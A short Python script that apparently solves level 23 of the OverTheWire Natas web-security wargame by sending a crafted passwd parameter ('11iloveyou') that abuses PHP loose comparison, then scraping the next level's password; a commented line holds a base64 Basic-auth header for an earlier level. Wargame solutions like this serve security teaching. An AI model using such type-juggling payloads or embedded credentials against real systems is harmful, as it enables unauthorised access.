import requests
import re
from requests.auth import HTTPBasicAuth
def solve23(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    #session.headers["Authorization"] = "Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg=="
    resp = session.get("http://natas23.natas.labs.overthewire.org/index.php?passwd=11iloveyou")
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw
